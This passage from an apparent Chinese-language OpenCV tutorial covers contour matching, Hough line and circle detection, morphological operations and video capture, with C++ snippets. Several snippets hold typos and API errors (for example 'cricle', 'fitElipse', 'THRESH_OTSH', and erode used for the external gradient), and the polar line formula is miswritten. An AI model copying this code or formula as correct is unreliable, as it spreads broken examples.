style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05017em;">B</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><p><img src="/images/pasted-73.png" alt="Hu的轮廓匹配" /></p><ul><li>代码</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//获取图像的边距省略了，这里匹配src2的第一个边距</span></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;Point&gt;&gt; contours1,contours2;</span><br><span class="line">Moments mm2=moments(contours2[<span class="number">0</span>]);</span><br><span class="line"><span class="comment">//计算src2的hu距</span></span><br><span class="line">Mat h2;</span><br><span class="line">HuMoments(mm2,hu2);</span><br><span class="line"><span class="comment">//遍历src1的边距</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">size_t</span> t=<span class="number">0</span>;t&lt;contours1.size();t++)&#123;</span><br><span class="line">  Moments mm = moments(contours1[t]);</span><br><span class="line">  Mat hu;</span><br><span class="line">  HuMoments(mm,hu);</span><br><span class="line">  <span class="comment">//比较hu距，Hu距具有伸缩不变形，旋转不变形，对于旋转和放缩在dist距离上只是稍微变化一点</span></span><br><span class="line">  <span class="keyword">double</span> dist = matchShapes(hu,hu2,CONTOURS_MATCH_I1,<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (dist&lt;<span class="number">1</span>)&#123;</span><br><span class="line">    drawContours(src1,contours1,t,Scalar(<span class="number">0</span>,<span class="number">0</span>,<span class="number">255</span>),<span class="number">2</span>,<span class="number">8</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//绘制轮廓的中心位置</span></span><br><span class="line">  <span class="keyword">double</span> cx=mm.mm10/mm.mm00;</span><br><span class="line">  <span class="keyword">double</span> cy=mm.mm01/mm.mm00;</span><br><span class="line">  circle(src1,Point(cx,cy),<span class="number">3</span>,Scalar(<span class="number">255</span>,<span class="number">0</span>,<span class="number">0</span>),<span class="number">2</span>,<span class="number">8</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="逼近"><a class="markdownIt-Anchor" href="#逼近"></a> 逼近</h3><ul><li>轮廓的逼近，本质是减少编码点</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">size_t</span> t=<span class="number">0</span>;t&lt;contours1.size();t++)&#123;</span><br><span class="line">  Mat res;</span><br><span class="line">  <span class="comment">//src,dst,多边形逼近的精度值,是不是闭合区域</span></span><br><span class="line">  approxPolyDP(contours[t],result,<span class="number">4</span>,<span class="literal">true</span>);</span><br><span class="line">  prinrf(<span class="string">&quot;corners:%d,columns:%d\n&quot;</span>,res.rows,res.cols);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="拟合"><a class="markdownIt-Anchor" href="#拟合"></a> 拟合</h3><ul><li>拟合圆，生成最相似的圆或者椭圆</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">size_t</span> t=<span class="number">0</span>;t&lt;contours1.size();t++)&#123;</span><br><span class="line">  <span class="comment">//拟合圆fitElipse，拟合线段fitLine</span></span><br><span class="line">  RotatedRect rrt=fitElipse(contours[t]);</span><br><span class="line">  <span class="keyword">float</span> w=rrt.size.width,h=rrt.size.height;</span><br><span class="line">  Porint center=rrt.center;</span><br><span class="line">  circle(src,center,<span class="number">3</span>,Scalar(<span class="number">255</span>,<span class="number">0</span>,<span class="number">0</span>),<span class="number">2</span>,<span class="number">8</span>,<span class="number">0</span>);</span><br><span class="line">  elipse(src,rrt,Scalar(<span class="number">0</span>,<span class="number">255</span>,<span class="number">0</span>),<span class="number">2</span>,<span class="number">8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="点集的最小外包"><a class="markdownIt-Anchor" href="#点集的最小外包"></a> 点集的最小外包</h2><h2 id="霍夫直线检测"><a class="markdownIt-Anchor" href="#霍夫直线检测"></a> 霍夫直线检测</h2><ul><li><p>直线在平面坐标有两个参数决定（截距b,斜率k）：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>y</mi><mo>=</mo><mo stretchy="false">(</mo><mo>−</mo><mfrac><mrow><mi>cos</mi><mo>⁡</mo><mi>θ</mi></mrow><mrow><mi>sin</mi><mo>⁡</mo><mi>θ</mi></mrow></mfrac><mo stretchy="false">)</mo><mi>x</mi><mo>+</mo><mo stretchy="false">(</mo><mfrac><mi>r</mi><mrow><mi>sin</mi><mo>⁡</mo><mi>θ</mi></mrow></mfrac><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">y=(-\frac{\cos{\theta}}{\sin{\theta}})x+(\frac{r}{\sin{\theta}})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.2251079999999999em;vertical-align:-0.345em;"></span><span class="mopen">(</span><span class="mord">−</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8801079999999999em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mop mtight">sin</span><span class="mspace mtight" style="margin-right:0.19516666666666668em;"></span><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.02778em;">θ</span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mop mtight">cos</span><span class="mspace mtight" style="margin-right:0.19516666666666668em;"></span><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.02778em;">θ</span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">)</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.095em;vertical-align:-0.345em;"></span><span class="mopen">(</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.695392em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mop mtight">sin</span><span class="mspace mtight" style="margin-right:0.19516666666666668em;"></span><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.02778em;">θ</span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.02778em;">r</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">)</span></span></span></span></p></li><li><p>在极坐标空间两个参数决定（半径r,角度θ）:<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>r</mi><mo>=</mo><mi>x</mi><mi>cos</mi><mo>⁡</mo><mi>θ</mi><mi>sin</mi><mo>⁡</mo><mi>θ</mi></mrow><annotation encoding="application/x-tex">r=x\cos{\theta}\sin{\theta}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop">cos</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop">sin</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span></span></span></span></span></p></li><li><p>霍夫检测的原理就是利用极坐标方程，如果边缘上的点在一条直线上，尝试使用不同的θ值，获取对应r值，那么他们肯定相交于一点。利用这个点就可以得到直线方程。</p></li></ul><p><img src="/images/pasted-74.png" alt="霍夫检测" /></p><table><thead><tr><th>针对二值图像</th><th></th></tr></thead><tbody><tr><td>HoughLines</td><td>霍夫直线，极坐标空间参数vector(ρ,θ)</td></tr><tr><td>HoughLinesP</td><td>霍夫直线，所有可能的线段和直线</td></tr></tbody></table><ul><li>代码实现</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">vector</span>&lt;Vec3f&gt;lines;</span><br><span class="line"><span class="comment">//input,output,r步长,θ步长,阈值：超过多少次相交才算直线,多尺度检测</span></span><br><span class="line">HoughLines(binary,lines,<span class="number">1</span>,CV_PI/<span class="number">180</span>,<span class="number">100</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line"><span class="comment">//绘制检测</span></span><br><span class="line">Point pt1,pt2;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;lines.size();i++)&#123;</span><br><span class="line">  <span class="keyword">float</span> rho = lines[i][<span class="number">0</span>]; <span class="comment">//距离</span></span><br><span class="line">  <span class="keyword">float</span> theta = lines[i][<span class="number">1</span>]; <span class="comment">//角度</span></span><br><span class="line">  <span class="keyword">float</span> acc = lines[i][<span class="number">2</span>];  <span class="comment">// 累加值</span></span><br><span class="line">  <span class="comment">//绘制所有的直线</span></span><br><span class="line">  <span class="keyword">double</span> a=<span class="built_in">cos</span>(theta);</span><br><span class="line">  <span class="keyword">double</span> b=<span class="built_in">sin</span>(theta);</span><br><span class="line">  <span class="keyword">double</span> x0=a*rho,y0=b*rho;</span><br><span class="line">  pt1.x=cvRound(x0+<span class="number">1000</span>*(-b));</span><br><span class="line">  pt1.y=cvRound(y0+<span class="number">1000</span>*(a));</span><br><span class="line">  pt2.x=cvRound(x0<span class="number">-1000</span>*(-b));</span><br><span class="line">  pt2.y=cvRound(x0<span class="number">-1000</span>*(a));</span><br><span class="line">  <span class="comment">//可以根据角度分别画出不同直线</span></span><br><span class="line">  <span class="keyword">if</span>(rho&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    line(src,pt1,pt2,Scalar(<span class="number">0</span>,<span class="number">0</span>,<span class="number">255</span>),<span class="number">2</span>,<span class="number">8</span>,<span class="number">0</span>);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    line(src,pt1,pt2,Scalar(<span class="number">0</span>,<span class="number">255</span>,<span class="number">255</span>),<span class="number">2</span>,<span class="number">8</span>,<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Mat src=imread(<span class="string">&quot;1.jpg&quot;</span>),binary;</span><br><span class="line">Canny(src,binary,<span class="number">80</span>,<span class="number">160</span>,<span class="number">3</span>,<span class="literal">false</span>);</span><br><span class="line"><span class="built_in">vector</span>&lt;Vec4i&gt; lines;</span><br><span class="line"><span class="comment">//input,output,r步长,θ步长,阈值,线段最小长度,最大的线段剪短距离,</span></span><br><span class="line">HoughLinesP(binary,lines,<span class="number">1</span>,CV_PI/<span class="number">180</span>,<span class="number">100</span>,<span class="number">30</span>,<span class="number">10</span>);</span><br><span class="line">Mat dst=Mat::zeros(src.size(),src.type());</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;line.size();i++)&#123;</span><br><span class="line">  line(dst,Point(line[i][<span class="number">0</span>],line[i][<span class="number">1</span>]),Point(line[i][<span class="number">2</span>],line[i][<span class="number">3</span>]),Scalar(<span class="number">0</span>,<span class="number">0</span>,<span class="number">255</span>),<span class="number">2</span>,<span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line">imshow(<span class="string">&quot;hough line p&quot;</span>,dst);</span><br></pre></td></tr></table></figure><h2 id="霍夫圆检测"><a class="markdownIt-Anchor" href="#霍夫圆检测"></a> 霍夫圆检测</h2><ul><li>圆在平面坐标由三个参数决定<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><msub><mi>x</mi><mn>0</mn></msub><mo separator="true">,</mo><msub><mi>y</mi><mn>0</mn></msub><mo separator="true">,</mo><mi>r</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(x_0,y_0,r)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mclose">)</span></span></span></span></li><li>参数方程描述：</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mo>=</mo><msub><mi>x</mi><mn>0</mn></msub><mo>+</mo><mi>r</mi><mi>cos</mi><mo>⁡</mo><mi>θ</mi></mrow><annotation encoding="application/x-tex">x=x_0+r\cos{\theta}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop">cos</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span></span></span></span></span></span></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>y</mi><mo>=</mo><msub><mi>y</mi><mn>0</mn></msub><mo>+</mo><mi>r</mi><mi>sin</mi><mo>⁡</mo><mi>θ</mi></mrow><annotation encoding="application/x-tex">y=y_0+r\sin{\theta}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop">sin</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span></span></span></span></span></span></p><ul><li>霍夫圆检测的原理是，在同一个圆线上的三个点，同时做半径为r的圆，如果相交于三点内的一个点，证明三点共圆，并且交点就是中心点。</li></ul><p><img src="/images/pasted-75.png" alt="霍夫圆检测" /></p><ul><li>霍夫圆检测的时候，不会遍历所有的半径，需要指定</li><li>候选节点会基于梯度寻找，目的为了减少未知参数</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Mat src=imread(<span class="string">&quot;1.jpg&quot;</span>),gray;</span><br><span class="line">cvtColor(src,gray,COLOR_BGR2GRAY);</span><br><span class="line">GaussianBlur(gray,gray,Size(<span class="number">9</span>,<span class="number">9</span>),<span class="number">2</span>,<span class="number">2</span>);</span><br><span class="line"><span class="built_in">vector</span>&lt;Vec3f&gt;circles;</span><br><span class="line"><span class="comment">//input,output,霍夫梯度,dp,minDist,Canny边缘提取,阈值,最小半径,最大半径</span></span><br><span class="line"><span class="keyword">int</span> minDist=<span class="number">10</span>;</span><br><span class="line"><span class="keyword">double</span> minRadius=<span class="number">20</span>,maxRadius=<span class="number">100</span>;</span><br><span class="line">HoughCircles(gray,circles,HOUGH_GRADIENT,<span class="number">2</span>,minDist,<span class="number">100</span>,<span class="number">100</span>,minRadius,maxRadius);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">size_t</span> t=<span class="number">0</span>;t&lt;&gt;circles.size();t++)&#123;</span><br><span class="line">  <span class="function">Point <span class="title">center</span><span class="params">(circles[t][<span class="number">0</span>],circles[t][<span class="number">1</span>])</span></span>;</span><br><span class="line">  <span class="keyword">int</span> radius=round(circles[t][<span class="number">2</span>]);</span><br><span class="line">  <span class="comment">//圆</span></span><br><span class="line">  cricle(src,center,radius,Scalar(<span class="number">0</span>,<span class="number">0</span>,<span class="number">255</span>),<span class="number">2</span>,<span class="number">8</span>,<span class="number">0</span>);</span><br><span class="line">  <span class="comment">//圆心</span></span><br><span class="line">  cricle(src,center,<span class="number">2</span>,Scalar(<span class="number">0</span>,<span class="number">255</span>,<span class="number">255</span>),<span class="number">2</span>,<span class="number">8</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">imshow(<span class="string">&quot;input&quot;</span>,src);</span><br></pre></td></tr></table></figure><ul><li>霍夫检测是对噪声很敏感的检测方法，图像尽量首先进行高斯模糊进行降噪。还有很多参数属于经验参数，需要多次调整。</li></ul><h1 id="形态学"><a class="markdownIt-Anchor" href="#形态学"></a> 形态学</h1><ul><li>形态学是图像处理的单独分支学科</li><li>灰度与二值图像处理中重要手段</li><li>由数学的集合论等相关理论中发展起来的</li><li>在机器视觉、ORC等领域有重要作用</li></ul><p><img src="/images/pasted-76.png" alt="形态学" /></p><h2 id="腐蚀与膨胀"><a class="markdownIt-Anchor" href="#腐蚀与膨胀"></a> 腐蚀与膨胀</h2><ul><li><p>腐蚀：最小值滤波，用最小值代替中心像素。<br /><img src="/images/pasted-78.png" alt="upload successful" /></p></li><li><p>膨胀：最大值滤波，用最大值代替中心像素。膨胀操作可以将两个分离区域合并<br /><img src="/images/pasted-77.png" alt="upload successful" /></p></li></ul><h3 id="结构元素形状"><a class="markdownIt-Anchor" href="#结构元素形状"></a> 结构元素形状</h3><ul><li>线型：水平、垂直</li><li>矩形：w·h</li><li>十字交叉：四邻域、八邻域</li></ul><h3 id="代码实现-14"><a class="markdownIt-Anchor" href="#代码实现-14"></a> 代码实现</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//腐蚀操作</span></span><br><span class="line"><span class="comment">//结构元素：矩形元素，大小，中心位置</span></span><br><span class="line">Mat kernel=getStructingElement(MORPH_RECT,Size(<span class="number">5</span>,<span class="number">5</span>),Point(<span class="number">-1</span>,<span class="number">-1</span>));</span><br><span class="line">erode(binary,binary,kernel);</span><br><span class="line">erode(src,src,kernel);</span><br><span class="line"><span class="comment">//膨胀操作</span></span><br><span class="line">dilate(src,src,kernel);</span><br></pre></td></tr></table></figure><h2 id="开闭运算"><a class="markdownIt-Anchor" href="#开闭运算"></a> 开闭运算</h2><h3 id="开运算"><a class="markdownIt-Anchor" href="#开运算"></a> 开运算</h3><ul><li>开操作=腐蚀+膨胀</li><li>意义：删除小的干扰块，可以用户验证码干扰的清除</li></ul><p><img src="/images/pasted-79.png" alt="开运算" /></p><h3 id="闭运算"><a class="markdownIt-Anchor" href="#闭运算"></a> 闭运算</h3><ul><li>闭操作=膨胀+腐蚀</li><li>意义：填充合并区域</li></ul><p><img src="/images/pasted-80.png" alt="闭运算" /></p><h3 id="代码实现-15"><a class="markdownIt-Anchor" href="#代码实现-15"></a> 代码实现</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Mat kernel=getStructingElement(MORPH_RECT,Size(<span class="number">5</span>,<span class="number">5</span>),Point(<span class="number">-1</span>,<span class="number">-1</span>));</span><br><span class="line"><span class="comment">//input,output,形态学操作枚举,结构元素,中心位置,连续进行形态学操作</span></span><br><span class="line">morphologyEx(binary,dst,MORPH_OPEN,kernel,Point(<span class="number">-1</span>,<span class="number">-1</span>),<span class="number">1</span>);</span><br></pre></td></tr></table></figure><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>MORPH_OPEN</td><td>开操作</td></tr><tr><td>MORPH_CLOSE</td><td>闭操作</td></tr><tr><td>MORPH_GRADIENT</td><td>基本梯度</td></tr><tr><td>MORPH_TOPHAT</td><td>顶帽操作</td></tr><tr><td>MORPH_BLACKHAT</td><td>黑帽操作</td></tr><tr><td>MORPH_HITMISS</td><td>击中击不中</td></tr></tbody></table><h3 id="结构元素的作用"><a class="markdownIt-Anchor" href="#结构元素的作用"></a> 结构元素的作用</h3><ul><li>结构元素是矩形时，闭操作之后的空洞呈方形。可以改变结构元素枚举类型：MORPH_CIRCLE</li><li>交友元素的size设置为(15,1)可以只提取横线。</li></ul><h2 id="形态学梯度"><a class="markdownIt-Anchor" href="#形态学梯度"></a> 形态学梯度</h2><ul><li>基本梯度 – 膨胀减去腐蚀之后的结果</li><li>内梯度 – 原图减去腐蚀之后的结果</li><li>外梯度 – 膨胀减去原图的结果</li></ul><h3 id="代码实现-16"><a class="markdownIt-Anchor" href="#代码实现-16"></a> 代码实现</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Mat kernel=getStructingElement(MORPH_RECT,Size(<span class="number">5</span>,<span class="number">5</span>),Point(<span class="number">-1</span>,<span class="number">-1</span>));</span><br><span class="line">Mat basic_grad,inter_grad,exter_grad;</span><br><span class="line"><span class="comment">//基本梯度</span></span><br><span class="line">morphologyEx(binary,basic_grad,MORPH_GRADIENT,kernel,Point(<span class="number">-1</span>,<span class="number">-1</span>),<span class="number">1</span>);</span><br><span class="line">Mat dst1,dst2;</span><br><span class="line"><span class="comment">//内梯度</span></span><br><span class="line">erode(gray,dst1,kernel);</span><br><span class="line">subtract(gray,dst1,inter_grad);</span><br><span class="line"><span class="comment">//外梯度</span></span><br><span class="line">erode(gray,dst2,kernel);</span><br><span class="line">subtract(dst2,gray,exter_grad);</span><br><span class="line"><span class="comment">//利用基本梯度进行二值化</span></span><br><span class="line">threshold(basic_grad,binary,<span class="number">0</span>,<span class="number">255</span>,THRESH_BINARY|THRESH_OTSH);</span><br></pre></td></tr></table></figure><h2 id="顶帽运算和底帽运算"><a class="markdownIt-Anchor" href="#顶帽运算和底帽运算"></a> 顶帽运算和底帽运算</h2><ul><li>顶帽：是原图减去开操作之后的结果</li><li>黑帽：是闭操作之后结果减去原图</li><li>顶帽与黑帽的作用是用来提取图像中微小有用信息块</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Mat kernel=getStructingElement(MORPH_RECT,Size(<span class="number">5</span>,<span class="number">5</span>),Point(<span class="number">-1</span>,<span class="number">-1</span>));</span><br><span class="line">morphologyEx(binary,dst,MORPH_TOPHAT,kernel,Point(<span class="number">-1</span>,<span class="number">-1</span>),<span class="number">1</span>);</span><br></pre></td></tr></table></figure><h2 id="击中击不中"><a class="markdownIt-Anchor" href="#击中击不中"></a> 击中击不中</h2><p><img src="/images/pasted-81.png" alt="击中击不中" /></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//十字交叉的结构元素</span></span><br><span class="line">Mat kernel=getStructingElement(MORPH_CROSS,Size(<span class="number">5</span>,<span class="number">5</span>),Point(<span class="number">-1</span>,<span class="number">-1</span>));</span><br><span class="line">morphologyEx(binary,dst,MORPH_HITMISS,kernel,Point(<span class="number">-1</span>,<span class="number">-1</span>),<span class="number">1</span>);</span><br></pre></td></tr></table></figure><h1 id="视频分析"><a class="markdownIt-Anchor" href="#视频分析"></a> 视频分析</h1><h2 id="视频文件操作"><a class="markdownIt-Anchor" href="#视频文件操作"></a> 视频文件操作</h2><ul><li>支持视频文件读写</li><li>摄像头与视频流</li></ul><h3 id="读取摄像头设备"><a class="markdownIt-Anchor" href="#读取摄像头设备"></a> 读取摄像头设备</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">VideoCapture <span class="title">capture</span><span class="params">(<span class="number">0</span>)</span></span>;</span><br><span class="line"><span class="keyword">if</span>(!capture.isOpened())<span class="keyword">return</span>;</span><br><span class="line">namedWindow(<span class="string">&quot;frame&quot;</span>,WINDOW_AUTOSIZE);</span><br><span class="line">Mat frame;</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line">  <span class="keyword">bool</span> ret = capture.read(frame);</span><br><span class="line">  <span class="keyword">if</span>(!ret)<span class="keyword">break</span>;</span><br><span class="line">  imshow(<span class="string">&quot;frame&quot;</span>);</span><br><span class="line">  <span class="keyword">char</span> c=waitKey(<span class="number">50</span>);</span><br><span class="line">  <span class="keyword">if</span>(c==<span class="number">27</span>)<span class="keyword">break</span>; <span class="comment">//esc则退出</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="读取视频文件"><a class="markdownIt-Anchor" href="#读取视频文件"></a> 读取视频文件</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">VideoCapture <span class="title">capture</span><span class="params">(<span class="string">&quot;1.mp4&quot;</span>)</span></span>;</span><br><span class="line"><span class="comment">//获取帧率</span></span><br><span class="line"><span class="keyword">int</span> fps = capture.get(CAP_PROP_FPS);</span><br><span class="line"><span class="comment">//获取宽度</span></span><br><span class="line"><span class="keyword">int</span> width = capture.get(CAP_PROP_FRAME_WIDTH);</span><br><span class="line"><span class="comment">//获取高度</span></span><br><span class="line"><span class="keyword">int</span> height = capture.get(CAP_PROP_FRAME_HEIGHT);</span><br><span class="line"><span class="comment">//获取总帧数</span></span><br><span class="line"><span class="keyword">int</span> total_frams</span><br><span class="line"> = capture.get(CAP_PROP_FRAME_COUNT);</span><br><span class="line"><span class="comment">//视频类型</span></span><br><span class="line"><span class="keyword">int</span> type=capture.get(CAP_PROP_FOURCC)</span><br></pre></td></tr></table></figure><h3 id="读取网络视频文件"><a class="markdownIt-Anchor" href="#读取网络视频文件"></a> 读取网络视频文件</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">VideoCapture <span class="title">capture</span><span class="params">(<span class="string">&quot;http://www.xxx.com/1.mp4&quot;</span>)</span></span>;</span><br></pre></td></tr></table></figure><h3 id="保存一段视频"><a class="markdownIt-Anchor" href="#保存一段视频"></a> 保存一段视频</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Mat 